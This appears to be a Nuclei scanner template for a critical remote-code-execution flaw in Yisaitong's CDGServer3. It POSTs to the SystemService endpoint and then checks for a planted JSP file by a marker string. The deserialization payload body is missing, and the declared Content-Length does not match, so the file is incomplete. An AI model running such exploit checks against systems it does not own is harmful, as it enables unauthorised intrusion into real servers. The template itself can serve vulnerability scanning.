id: yisaitong-RCE-CDGXStreamDeser-SystemService
info:
  name: yisaitong-RCE-CDGXStreamDeser-SystemService
  author: yisaitong-RCE-CDGXStreamDeser-SystemService
  severity: critical

requests:
  - raw:
      - |-
        POST /CDGServer3/SystemService?command=GETSYSTEMINFO HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Content-Type: text/xml
        Host: {{Hostname}}
        Content-Length: 4998

        
      - |+
        GET /CDGServer3/CDGXstreamDesers.jsp HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ksjldfio8978sahdkjfsdfjha'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
